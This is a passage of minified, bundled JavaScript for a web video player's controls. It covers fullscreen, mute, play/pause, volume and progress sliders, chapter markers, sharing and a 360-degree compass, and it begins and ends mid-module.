expression must either be null or a function, not "+typeof t);e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,e),i(t,[{key:"_addPlayerListeners",value:function(){this._updateState=this._updateState.bind(this),this._player.on("fullscreen:change",this._updateState)}},{key:"_updateState",value:function(){this._view.setState(this._player.isFullscreen()?"on":"off")}},{key:"_onClick",value:function(){this._player.toggleFullscreen(!this._player.isFullscreen())}},{key:"destroy",value:function(){this._player.off("fullscreen:change",this._updateState),r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"destroy",this).call(this)}}]),t}(e("./ButtonBehavior"));t.exports=o},{"./ButtonBehavior":335}],339:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=function e(t,n,i){null===t&&(t=Function.prototype);var r=Object.getOwnPropertyDescriptor(t,n);if(void 0===r){var o=Object.getPrototypeOf(t);return null===o?void 0:e(o,n,i)}if("value"in r)return r.value;var s=r.get;return void 0!==s?s.call(i):void 0},o=e("./ButtonBehavior"),s=e("../../utils/liveStreamLookback"),a=function(e){function t(e,n){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t);var i=function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!=typeof t&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,n));return i._updateState=i._updateState.bind(i),i._player.on("timeupdate",i._updateState),i}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+typeof t);e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,e),i(t,[{key:"_updateState",value:function(){this._player.getDuration()-this._player.getCurrentTime()<s?this._view.setState("on"):this._view.setState("off")}},{key:"_onClick",value:function(){this._player.goToLive()}},{key:"destroy",value:function(){this._player.off("timeupdate",this._updateState),r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"destroy",this).call(this)}}]),t}(o);t.exports=a},{"../../utils/liveStreamLookback":390,"./ButtonBehavior":335}],340:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=function e(t,n,i){null===t&&(t=Function.prototype);var r=Object.getOwnPropertyDescriptor(t,n);if(void 0===r){var o=Object.getPrototypeOf(t);return null===o?void 0:e(o,n,i)}if("value"in r)return r.value;var s=r.get;return void 0!==s?s.call(i):void 0},o=function(e){function t(e,n){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t);var i=function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!=typeof t&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,n));return i._updateState(),i}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+typeof t);e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,e),i(t,[{key:"_updateState",value:function(){this._view.setState(this._player.getMuted()?"on":"off")}},{key:"_addPlayerListeners",value:function(){this._updateState=this._updateState.bind(this),this._player.on("volumechange",this._updateState)}},{key:"_onClick",value:function(){this._player.getMuted()?(this._player.setMuted(!1),0===this._player.getVolume()&&this._player.setVolume(.1)):this._player.setMuted(!0)}},{key:"destroy",value:function(){this._player.off("volumechange",this._updateState),r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"destroy",this).call(this)}}]),t}(e("./ButtonBehavior"));t.exports=o},{"./ButtonBehavior":335}],341:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=function e(t,n,i){null===t&&(t=Function.prototype);var r=Object.getOwnPropertyDescriptor(t,n);if(void 0===r){var o=Object.getPrototypeOf(t);return null===o?void 0:e(o,n,i)}if("value"in r)return r.value;var s=r.get;return void 0!==s?s.call(i):void 0},o=function(e){function t(e,n){return function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t),function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!=typeof t&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,n))}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+typeof t);e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,e),i(t,[{key:"_initialize",value:function(){this._updateButtonState=this._updateButtonState.bind(this),this._player.supportsPictureInPicture()&&(this._updateButtonState(),this._player.on("webkitpresentationmodechanged",this._updateButtonState)),r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"_initialize",this).call(this)}},{key:"_onClick",value:function(){this._player.setPictureInPicture(!this._player.isPictureInPicture())}},{key:"_updateButtonState",value:function(){this._view.setState(this._player.isPictureInPicture()?"on":"off")}},{key:"destroy",value:function(){this._player.off("webkitpresentationmodechanged",this._updateButtonState),r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"destroy",this).call(this)}}]),t}(e("./ButtonBehavior"));t.exports=o},{"./ButtonBehavior":335}],342:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=function e(t,n,i){null===t&&(t=Function.prototype);var r=Object.getOwnPropertyDescriptor(t,n);if(void 0===r){var o=Object.getPrototypeOf(t);return null===o?void 0:e(o,n,i)}if("value"in r)return r.value;var s=r.get;return void 0!==s?s.call(i):void 0},o=function(e){function t(e,n){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t);var i=function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!=typeof t&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,n));return i._setPlayingState(),i}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+typeof t);e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,e),i(t,[{key:"_addPlayerListeners",value:function(){this._setPlayingState=this._setPlayingState.bind(this),this._player.on("play",this._setPlayingState),this._player.on("playing",this._setPlayingState),this._player.on("pause",this._setPlayingState),this._player.on("ended",this._setPlayingState)}},{key:"_onClick",value:function(){this._togglePlay()}},{key:"_setPlayingState",value:function(){this._player.getEnded()?this._view.setState("ended"):this._view.setState(this._player.getPaused()?"paused":"playing")}},{key:"_togglePlay",value:function(){this._player.getPaused()||this._player.getEnded()?this._player.play():this._player.pause()}},{key:"destroy",value:function(){this._player.off("play",this._setPlayingState),this._player.off("pause",this._setPlayingState),this._player.off("playing",this._setPlayingState),this._player.off("ended",this._setPlayingState),r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"destroy",this).call(this)}}]),t}(e("./ButtonBehavior"));t.exports=o},{"./ButtonBehavior":335}],343:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=e("./BaseBehavior"),o=e("@marcom/ac-string/supplant"),s="is-playing",a=e("@marcom/ac-raf-emitter/draw"),c=e("@marcom/ac-raf-emitter/cancelDraw"),l=e("../../utils/liveStreamLookback"),u=function(e){function t(e,n){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t);var i=function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!=typeof t&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,n));return i._player.isDvr()?i._liveStreamLookback=l:i._liveStreamLookback=0,i._visible=!1,i._ariaTextTemplate=n.localization.currenttimetext,i._onDurationChange(),i._refreshChapters(),i}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+typeof t);e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,e),i(t,[{key:"_addViewListeners",value:function(){this._onSliderGrab=this._onSliderGrab.bind(this),this._onSliderChange=this._onSliderChange.bind(this),this._onSliderRelease=this._onSliderRelease.bind(this),this._onChapterClicked=this._onChapterClicked.bind(this),this._onChapterFocusIn=this._onChapterFocusIn.bind(this),this._onChapterFocusOut=this._onChapterFocusOut.bind(this),this._view.on("grab",this._onSliderGrab),this._view.on("chapter:click",this._onChapterClicked),this._view.on("chapter:focusin",this._onChapterFocusIn),this._view.on("chapter:focusout",this._onChapterFocusOut)}},{key:"_addPlayerListeners",value:function(){this._onTimeUpdate=this._onTimeUpdate.bind(this),this._onPlay=this._onPlay.bind(this),this._onPause=this._onPause.bind(this),this._onEnded=this._onEnded.bind(this),this._onDurationChange=this._onDurationChange.bind(this),this._onProgress=this._onProgress.bind(this),this._refreshChapters=this._refreshChapters.bind(this),this._onRAF=this._onRAF.bind(this),this._player.on("durationchange",this._onDurationChange),this._player.on("loadstart",this._onEnded),this._player.on("ended",this._onEnded),this._player.on("timeupdate",this._onTimeUpdate),this._player.on("progress",this._onProgress),this._player.on("play",this._onPlay),this._player.on("pause",this._onPause),this._player.on("ended",this._onEnded),this._player.on("chapters:change",this._refreshChapters)}},{key:"_onProgress",value:function(){this._view.setBufferedValue(this._player.getBufferedPercentage())}},{key:"_setIsPlaying",value:function(e){e?this._view.setState(s):this._view.clearState(s)}},{key:"_onPlay",value:function(){this._setIsPlaying(!0),this._player.isLive()||(c(this._timeUpdateInterval),this._raf=a(this._onRAF))}},{key:"_onRAF",value:function(){this._onTimeUpdate(),this._timeUpdateInterval=a(this._onRAF)}},{key:"_onPause",value:function(){this._setIsPlaying(!1),c(this._raf),c(this._timeUpdateInterval),this._onTimeUpdate()}},{key:"_onEnded",value:function(){this._onPause(),this._updateSliderPosition(0)}},{key:"_onChapterClicked",value:function(e){this._player.setCurrentTime(e["start-time"])}},{key:"_onChapterFocusIn",value:function(e){this._chapterFocused=!0,this._player.controls.overlays.setPopUpPosition(e["start-time"])}},{key:"_onChapterFocusOut",value:function(e){this._chapterFocused=!1}},{key:"_refreshChapters",value:function(){var e=this._cachedDuration=Math.max(0,this._player.getDuration()-this._liveStreamLookback);e&&!isNaN(e)&&e!==Math.Infinity?this._view.setChapters(this._player.getChapters().map((function(t){var n=t["start-time"]/e*100;return Object.assign({},t,{startTimeInPercentage:n+"%",startTime:n,"start-time":parseFloat(t["start-time"])})}))):this._view.setChapters([])}},{key:"_onSliderGrab",value:function(){this._chapterFocused||(this._player.off("timeupdate",this._onTimeUpdate),c(this._timeUpdateInterval),this._view.off("grab",this._onSliderGrab),this._view.on("change",this._onSliderChange),this._view.on("release",this._onSliderRelease),this._onPause())}},{key:"_onSliderRelease",value:function(){this._chapterFocused||(this._view.off("change",this._onSliderChange),this._view.off("release",this._onSliderRelease),this._view.on("grab",this._onSliderGrab),this._player.on("timeupdate",this._onTimeUpdate),this._player.getPaused()||this._onPlay())}},{key:"_getDuration",value:function(){return this._cachedDuration&&isNaN(this._cachedDuration)||(this._cachedDuration=Math.max(0,this._player.getDuration()-this._liveStreamLookback)),this._cachedDuration}},{key:"_getTimeAsPercent",value:function(){return this._player.getCurrentTime()/this._getDuration()}},{key:"_onDurationChange",value:function(){this._cachedDuration=Math.max(0,this._player.getDuration()-this._liveStreamLookback),this._updateSliderPosition(this._getTimeAsPercent()),this._player.getPaused()||this._onPlay(),this._refreshChapters(),0===this._cachedDuration||isNaN(this._cachedDuration)?this._view.hide():this._view.show()}},{key:"_onSliderChange",value:function(){if(!this._player.getEnded()&&!isNaN(this._getDuration())&&0!==this._getDuration()){var e=this._view.getValue();this._setPlayerCurrentTime(e*this._getDuration()),this._setAriaValueText(e*this._getDuration()),this._updateScrubbedValue()}}},{key:"_onTimeUpdate",value:function(){this._updateSliderPosition(this._getTimeAsPercent())}},{key:"_updateSliderPosition",value:function(e){this._view.setValue(e),this._setAriaValueText(e*this._getDuration()),this._updateScrubbedValue(),this._visible||isNaN(this._getDuration())||(this._view.show(),this._visible=!0)}},{key:"_setAriaValueText",value:function(e){var t=Math.floor(e/60),n=Math.ceil(e%60);this._view.setAriaValueText(o(this._ariaTextTemplate,{minutes:t,seconds:n}))}},{key:"_updateScrubbedValue",value:function(){this._view.setScrubbedValue()}},{key:"_setPlayerCurrentTime",value:function(e){this._player.setCurrentTime(e)}},{key:"_removeEventListeners",value:function(){this._player.chapters&&this._player.chapters.off("change",this._refreshChapters),this._player.off("durationchange",this._onDurationChange),this._player.off("loadstart",this._onEnded),this._player.off("ended",this._onEnded),this._player.off("timeupdate",this._onTimeUpdate),this._player.off("progress",this._onTimeUpdate),this._view.off("change",this._onSliderChange),this._view.off("release",this._onSliderRelease),this._view.off("grab",this._onSliderGrab),this._view.off("chapter:click",this._onChapterClicked),this._view.off("chapter:focusin",this._onChapterFocusIn),this._view.off("chapter:focusout",this._onChapterFocusOut),this._player.off("play",this._onPlay),this._player.off("pause",this._onPause),this._player.off("ended",this._onPause),this._player.off("chapters:change",this._refreshChapters)}},{key:"destroy",value:function(){this._removeEventListeners(),c(this._raf),c(this._timeUpdateInterval),this._view=null}}]),t}(r);t.exports=u},{"../../utils/liveStreamLookback":390,"./BaseBehavior":334,"@marcom/ac-raf-emitter/cancelDraw":247,"@marcom/ac-raf-emitter/draw":249,"@marcom/ac-string/supplant":300}],344:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=function e(t,n,i){null===t&&(t=Function.prototype);var r=Object.getOwnPropertyDescriptor(t,n);if(void 0===r){var o=Object.getPrototypeOf(t);return null===o?void 0:e(o,n,i)}if("value"in r)return r.value;var s=r.get;return void 0!==s?s.call(i):void 0},o=function(e){function t(e,n){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t);var i=function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!=typeof t&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,n));return i._player.states&&i._updateState(),i}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+typeof t);e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,e),i(t,[{key:"_addPlayerListeners",value:function(){this._updateState=this._updateState.bind(this),this._player.states&&this._player.states.on("statechange",this._updateState)}},{key:"_updateState",value:function(){this._stateChanging=!1,this._view.setState("sharing"===this._player.states.getCurrentState()?"on":"off")}},{key:"_onClick",value:function(){this._stateChanging||("sharing"===this._player.states.getCurrentState()?(this._view.setState("off"),this._player.states.setState("none")):(this._view.setState("on"),this._player.states.setState("sharing")),this._stateChanging=!0)}},{key:"destroy",value:function(){this._player.states&&this._player.states.off("statechange",this._updateState),r(t.prototype.__proto__||Object.getPrototypeOf(t.prototype),"destroy",this).call(this)}}]),t}(e("./ButtonBehavior"));t.exports=o},{"./ButtonBehavior":335}],345:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=e("./BaseBehavior"),o=e("../sharing/SharingModule"),s=function(e){function t(e,n){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t);var i=function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!=typeof t&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,n));return i._updateState(),i}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+typeof t);e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,e),i(t,[{key:"_updateState",value:function(){this.sharingModule=new o(Object.assign({},{player:this._player,parentView:this._view})),this.sharingModule.setData(this._player.options.sharing),this._view.el.innerHTML="",this._view.el.appendChild(this.sharingModule.el)}}]),t}(r);t.exports=s},{"../sharing/SharingModule":378,"./BaseBehavior":334}],346:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=function(e){function t(e,n){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t);var i=function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!=typeof t&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this,e,n));return i._hideVolume(),i._updateSliderVolumeValue(),i}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+typeof t);e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,e),i(t,[{key:"_addViewListeners",value:function(){this._showVolume=this._showVolume.bind(this),this._hideVolume=this._hideVolume.bind(this),this._onSliderGrab=this._onSliderGrab.bind(this),this._onSliderChange=this._onSliderChange.bind(this),this._onSliderRelease=this._onSliderRelease.bind(this),this._onFocusChange=this._onFocusChange.bind(this),this._view.on("grab",this._onSliderGrab),this._view.on("focuschange",this._onFocusChange)}},{key:"_addPlayerListeners",value:function(){this._updateSliderVolumeValue=this._updateSliderVolumeValue.bind(this),this._onUserVolumeChange=this._onUserVolumeChange.bind(this),this._player.once("durationchange",this._updateSliderVolumeValue),this._player.on("volumechange",this._updateSliderVolumeValue),this._player.on("uservolumechange",this._onUserVolumeChange)}},{key:"_onSliderGrab",value:function(){this._cachedVolume=this._player.getVolume(),this._player.off("volumechange",this._updateSliderVolumeValue),this._view.off("grab",this._onSliderGrab),this._view.on("change",this._onSliderChange),this._view.on("release",this._onSliderRelease)}},{key:"_onSliderRelease",value:function(){this._setPlayerVolume(this._view.getValue()),this._view.off("change",this._onSliderChange),this._view.off("release",this._onSliderRelease),this._view.on("grab",this._onSliderGrab),this._player.on("volumechange",this._updateSliderVolumeValue)}},{key:"_onSliderChange",value:function(){var e=this._view.getValue();this._setPlayerVolume(e),this._view.setScrubbedValue()}},{key:"_setPlayerVolume",value:function(e){e?(this._player.setMuted(!1),this._player.setVolume(e/100)):(this._player.setMuted(!0),this._player.setVolume(this._cachedVolume))}},{key:"_showVolume",value:function(){this._view.show()}},{key:"_hideVolume",value:function(){this._view.hide()}},{key:"_onUserVolumeChange",value:function(){this._showVolume(),clearTimeout(this._hideVolumeTimer),this._view.isFocused()||(this._hideVolumeTimer=setTimeout(this._hideVolume,1e3))}},{key:"_onFocusChange",value:function(){this._view.isFocused()?this._showVolume():this._hideVolume()}},{key:"_updateSliderVolumeValue",value:function(){if(this._player.getMuted())this._view.setValue(0),this._view.setScrubbedValue();else{var e=this._player.getVolume();this._view.setValue(100*e),this._view.setScrubbedValue()}}},{key:"_removeEventListeners",value:function(){this._player.off("durationchange",this._updateSliderVolumeValue),this._player.off("volumechange",this._updateSliderVolumeValue),this._player.off("uservolumechange",this._onUserVolumeChange),this._view.off("change",this._onSliderChange),this._view.off("release",this._onSliderRelease),this._view.off("grab",this._onSliderGrab)}},{key:"destroy",value:function(){this._removeEventListeners()}}]),t}(e("./BaseBehavior"));t.exports=r},{"./BaseBehavior":334}],347:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=e("@marcom/ac-event-emitter-micro").EventEmitterMicro,o=e("@marcom/ac-string/supplant"),s=e("../localization/Localization"),a=function(e){function t(e){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,t);var n=function(e,t){if(!e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return!t||"object"!=typeof t&&"function"!=typeof t?e:t}(this,(t.__proto__||Object.getPrototypeOf(t)).call(this));n.el=document.createElement("button"),n.el.className="ac-slider-chapter-container";var i=e.titles.find((function(e){return"en"===e.language}))||e.titles[0],r=s.getTranslation().chapter;n._chapterMarker=document.createElement("div"),n._chapterMarker.classList.add("ac-slider-chapter-marker"),"0%"===e.startTimeInPercentage&&n.el.classList.add("hidden-chapter"),n.el.style.left=e.startTimeInPercentage,n.el.setAttribute("data-acv-chapter-time",e["start-time"]),n.el.tabIndex=0,n._chapterData=e,n.el.appendChild(n._chapterMarker);var a=e["start-time"],c=Math.floor(a/60),l=Math.ceil(a%60);return n._span=document.createElement("span"),n._span.innerText=o(r,{chaptertitle:i.title,chaptertime:o(s.getTranslation().currenttimetext,{minutes:c,seconds:l})}),n.el.firstElementChild.appendChild(n._span),n._onClick=n._onClick.bind(n),n._onMouseOver=n._onMouseOver.bind(n),n._onMouseOut=n._onMouseOut.bind(n),n._onFocusIn=n._onFocusIn.bind(n),n._onFocusOut=n._onFocusOut.bind(n),n._onMouseDown=n._onMouseDown.bind(n),n.el.addEventListener("click",n._onClick),n.el.addEventListener("focusin",n._onFocusIn),n.el.addEventListener("focusout",n._onFocusOut),n.el.addEventListener("mouseover",n._onMouseOver),n.el.addEventListener("mouseout",n._onMouseOut),n.el.addEventListener("mousemove",n._onMouseMove),n.el.addEventListener("mousedown",n._onMouseDown),n}return function(e,t){if("function"!=typeof t&&null!==t)throw new TypeError("Super expression must either be null or a function, not "+typeof t);e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}(t,e),i(t,[{key:"_onClick",value:function(e){e.preventDefault(),e.stopPropagation(),this.trigger("click",this._chapterData)}},{key:"_onMouseOver",value:function(e){e.stopPropagation(),this.trigger("mouseover",this._chapterData)}},{key:"_onMouseOut",value:function(e){this.trigger("mouseout",this._chapterData)}},{key:"_onMouseMove",value:function(e){e.stopPropagation()}},{key:"_onMouseDown",value:function(e){e.stopPropagation()}},{key:"_onFocusIn",value:function(e){this.trigger("focusin",this._chapterData)}},{key:"_onFocusOut",value:function(e){this.trigger("focusout",this._chapterData)}},{key:"destroy",value:function(){this.el.removeEventListener("click",this._onClick),this.el.removeEventListener("focusin",this._onFocusIn),this.el.removeEventListener("focusout",this._onFocusOut),this.el.removeEventListener("mouseover",this._onMouseOver),this.el.removeEventListener("mouseout",this._onMouseOut),this.el.removeEventListener("mousemove",this._onMouseMove)}}]),t}(r);t.exports=a},{"../localization/Localization":373,"@marcom/ac-event-emitter-micro":122,"@marcom/ac-string/supplant":300}],348:[function(e,t,n){"use strict";var i=function(){function e(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(t,n,i){return n&&e(t.prototype,n),i&&e(t,i),t}}(),r=e("@marcom/ac-keyboard/Keyboard"),o=e("@marcom/useragent-detect"),s=o.os.ios||o.os.android,a=e("@marcom/ac-360"),c=function(){function e(t){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this._rootElement=t.rootElement,this._player=t.player,this._360=this._player.get360(),this.el=this._rootElement.querySelector(".compass-wrapper"),this.compassRing=this.el.querySelector(".compass-ring"),this.compassField=this.el.querySelector(".compass-field"),this.compass=this.el.querySelector(".compass"),this.compassArrows=this.el.querySelector(".compass-arrows"),this.compassArrowLeft=this.el.querySelector(".compass-arrow-left"),this.compassArrowRight=this.el.querySelector(".compass-arrow-right"),this.compassArrowTop=this.el.querySelector(".compass-arrow-top"),this.compassArrowBottom=this.el.querySelector(".compass-arrow-bottom"),this._keyboard=new r(this.el),this._arrowControls=this._player.get360().arrowControls,this._bindMethods(),this._addEventListeners()}return i(e,[{key:"_bindMethods",value:function(){this._onFocusIn=this._onFocusIn.bind(this),this._onFocusOut=this._onFocusOut.bind(this),this._onCompassClick=this._onCompassClick.bind(this),this._onCompassMouseEnter=this._onCompassMouseEnter.bind(this),this._onCompassMouseLeave=this._onCompassMouseLeave.bind(this),this._onCompassFocusIn=this._onCompassFocusIn.bind(this),this._onCompassFocusOut=this._onCompassFocusOut.bind(this),this._onRotationTransitionEnd=this._onRotationTransitionEnd.bind(this),this._onCompassArrowsClick=this._onCompassArrowsClick.bind(this),this._on360PositionChange=this._on360PositionChange.bind(this),this._on360IconUpdate=this._on360IconUpdate.bind(this),this._transitionTiming=this._transitionTiming.bind(this)}},{key:"_addEventListeners",value:function(){this._player.once("controlsready",function(){s||(this.compass.addEventListener("mouseenter",this._onCompassMouseEnter),this.compass.addEventListener("mouseleave",this._onCompassMouseLeave)),this.el.addEventListener("focusin",this._onFocusIn),this.el.addEventListener("focusout",this._onFocusOut),this.compass.addEventListener("click",this._onCompassClick),this.compass.addEventListener("focusin",this._onCompassFocusIn),this.compass.addEventListener("focusout",this._onCompassFocusOut),this.compassArrows.addEventListener("click",this._onCompassArrowsClick),this._360.on(a.POSITION_CHANGE,this._on360PositionChange),this._360.on(a.ROTATION_START,this._transitionTiming),this._360.on(a.ROTATION_COMPLETE,this._onRotationTransitionEnd)}.bind(this))}},{key:"_removeEventListeners",value:function(){this.el.removeEventListener("focusin",this._onFocusIn),this.el.removeEventListener("focusout",this._onFocusOut),this.compass.removeEventListener("click",this._onCompassClick),this.compass.removeEventListener("focusin",this._onCompassFocusIn),this.compass.removeEventListener("focusout",this._onCompassFocusOut),this.compass.removeEventListener("mouseenter",this._onCompassMouseEnter),this.compass.removeEventListener("mouseleave",this._onCompassMouseLeave),this.compassArrows.removeEventListener("click",this._onCompassArrowsClick),this._360.off(a.POSITION_CHANGE,this._on360PositionChange),this._360.off(a.ROTATION_START,this._transitionTiming),this._360.off(a.ROTATION_COMPLETE,this._onRotationTransitionEnd)}},{key:"_showCompassArrows",value:function(){this.el.classList.add("show-arrows")}},{key:"_hideCompassArrows",value:function(){this.el.classList.remove("show-arrows")}},{key:"_onRotationTransitionEnd",value:function(){this._compassIsRotating=!1,this._360.off(a.ROTATION_UPDATE,this._on360IconUpdate)}},{key:"_transitionTiming",value:function(e){var t=e.time,n=this._get360HorizontalAngle();this._compassIsRotating=!0,this.compassRing.style.transition="transform "+t+"ms cubic-bezier(0.25,0.1,0,1)",this.compassField.style.transition="transform "+t+"ms cubic-bezier(0.25,0.1,0,1)";var i="rotate(360deg)";n>180||n<-180?(this.compassRing.style.transform=i,this.compassField.style.transform=i):(this.compassRing.style.transform="rotate(0deg)",this.compassField.style.transform="rotate(0deg)")}},{key:"_on360IconUpdate",value:function(e){this.compassRing.style.transition="transform 0.1s ease",this.compassRing.style.transform="rotate("+e.currentPosition.lon+"deg)",this.compassField.style.transition="transform 0.1s ease",this.compassField.style.transform="rotate("+e.currentPosition.lon+"deg)"}},{key:"_onCompassClick",value:function(e){this._compassIsRotating||(this._player.get360().isAtOrigin?(this._360.on(a.ROTATION_UPDATE,this._on360IconUpdate),this._player.get360().oscillateLongitude()):this._player.panToOrigin())}},{key:"_onCompassArrowsClick",value:function(e){switch(e.target){case this.compassArrowLeft:this._arrowControls.leftArrowDown(e),this._arrowControls.leftArrowUp(e);break;case this.compassArrowRight:this._arrowControls.rightArrowDown(e),this._arrowControls.rightArrowUp(e);break;case this.compassArrowTop:this._arrowControls.upArrowDown(e),this._arrowControls.upArrowUp(e);break;case 